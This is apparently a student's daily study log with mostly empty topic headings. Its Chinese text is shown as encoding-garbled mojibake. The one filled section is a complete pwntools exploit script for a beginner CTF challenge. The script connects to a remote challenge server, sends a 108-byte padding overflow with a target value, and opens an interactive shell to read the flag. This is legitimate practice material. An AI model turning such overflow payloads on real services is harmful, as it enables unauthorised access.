# 2025å¹´12æœˆ14æ—¥ æ¯æ—¥æ€»ç»“


## ğŸ’¡ å¿ƒå¾—æ„Ÿæ‚Ÿ
      çŸ¥è¯†ç‚¹ï¼š
          ä¸€ã€Cè¯­è¨€ï¼š

          äºŒã€pythonï¼š

          ä¸‰ã€é«˜æ•°ï¼š

          å››ã€æ±‡ç¼–ï¼š

          äº”ã€linuxæŒ‡ä»¤ï¼š

          å…­ã€ctf:
          #!/usr/bin/env python3
# -*- coding: utf-8 -*-

# å¯¼å…¥pwntoolsåº“
from pwn import *

# è®¾ç½®ç¨‹åºè¿è¡Œç¯å¢ƒä¸º64ä½Linux
context(arch='amd64', os='linux')

def main():
    print("=== CTF PWN ç­¾åˆ°é¢˜åˆ©ç”¨è„šæœ¬ ===")
    print("ä½œè€…ï¼šPWNæ–°æ‰‹æ•™ç¨‹")
    print()
    
    # ç¬¬ä¸€æ­¥ï¼šè¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨
    print("[1] æ­£åœ¨è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨...")
    # remote()å‡½æ•°ç”¨äºå»ºç«‹TCPè¿æ¥
    # å‚æ•°1ï¼šä¸»æœºåœ°å€
    # å‚æ•°2ï¼šç«¯å£å·
    p = remote('challenge.imxbt.cn', 30942)
    
    # ç¬¬äºŒæ­¥ï¼šæ¥æ”¶ç¨‹åºåˆå§‹è¾“å‡º
    print("[2] æ¥æ”¶ç¨‹åºè¾“å‡º...")
    # recvuntil()ç­‰å¾…ç›´åˆ°æ”¶åˆ°æŒ‡å®šå­—ç¬¦ä¸²
    # è¿™é‡Œç­‰å¾…"do you like blueshark?\n"
    output = p.recvuntil(b"do you like blueshark?\n")
    print("ç¨‹åºè¾“å‡ºï¼š", output.decode('utf-8'))
    
    # ç¬¬ä¸‰æ­¥ï¼šæ„é€ payload
    print("[3] æ„é€ payload...")
    # payloadç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š
    # 1. 108ä¸ª'a'å­—ç¬¦ä½œä¸ºå¡«å……
    # 2. ç›®æ ‡å€¼0xADDAAAAAï¼ˆè½¬æ¢ä¸ºå°ç«¯åºï¼‰
    
    # æ–¹æ³•1ï¼šä½¿ç”¨p64()å‡½æ•°ï¼ˆæ¨èï¼‰
    payload = b'a' * 108  # å¡«å……108å­—èŠ‚
    payload += p64(0xADDAAAAA)  # æ·»åŠ ç›®æ ‡å€¼
    
    # æ–¹æ³•2ï¼šæ‰‹åŠ¨æ„é€ å°ç«¯åºï¼ˆç†è§£åŸç†ï¼‰
    # payload = b'a' * 108 + b'\xaa\xaa\xda\xad\x00\x00\x00\x00'
    
    print(f"Payloadé•¿åº¦ï¼š{len(payload)} å­—èŠ‚")
    print(f"Payloadå†…å®¹ï¼ˆåå…­è¿›åˆ¶ï¼‰ï¼š{payload.hex()}")
    
    # ç¬¬å››æ­¥ï¼šå‘é€payload
    print("[4] å‘é€payload...")
    # send()å‘é€æ•°æ®ï¼Œä¸æ·»åŠ æ¢è¡Œç¬¦
    # sendline()ä¼šæ·»åŠ æ¢è¡Œç¬¦ï¼Œè¿™é‡Œä¸è¦ç”¨
    p.send(payload)
    
    # ç¬¬äº”æ­¥ï¼šæ¥æ”¶ç¨‹åºå“åº”
    print("[5] æ¥æ”¶ç¨‹åºå“åº”...")
    # å°è¯•æ¥æ”¶ä¸€äº›è¾“å‡º
    try:
        response = p.recv(timeout=2)
        print("ç¨‹åºå“åº”ï¼š", response.decode('utf-8', errors='ignore'))
    except:
        print("æ²¡æœ‰æ”¶åˆ°å“åº”æˆ–å“åº”æ— æ³•è§£ç ")
    
    # ç¬¬å…­æ­¥ï¼šå°è¯•äº¤äº’æ¨¡å¼
    print("[6] å°è¯•è¿›å…¥äº¤äº’æ¨¡å¼...")
    print("å¦‚æœæˆåŠŸï¼Œä½ ç°åœ¨å¯ä»¥è¾“å…¥å‘½ä»¤äº†ï¼")
    print("å¸¸ç”¨å‘½ä»¤ï¼š")
    print("  ls - æŸ¥çœ‹å½“å‰ç›®å½•")
    print("  cat flag - æŸ¥çœ‹flagæ–‡ä»¶")
    print("  whoami - æŸ¥çœ‹å½“å‰ç”¨æˆ·")
    print("  exit - é€€å‡º")
    print()
    print("æŒ‰Ctrl+Då¯ä»¥é€€å‡ºäº¤äº’æ¨¡å¼")
    
    # interactive()è¿›å…¥äº¤äº’æ¨¡å¼
    p.interactive()
    
    # ç¬¬ä¸ƒæ­¥ï¼šå…³é—­è¿æ¥
    print("[7] å…³é—­è¿æ¥...")
    p.close()

if __name__ == "__main__":
    main()



      
      æŠ€å·§ç‚¹ï¼š
            ä¸€ã€Cè¯­è¨€ï¼š

          äºŒã€pythonï¼š

          ä¸‰ã€é«˜æ•°ï¼š

          å››ã€æ±‡ç¼–ï¼š

          äº”ã€linuxæŒ‡ä»¤ï¼š
            

      



**è‡ªåŠ¨åˆ›å»ºæ—¶é—´ï¼š** Sun Dec 14 00:24:01 CST 2025
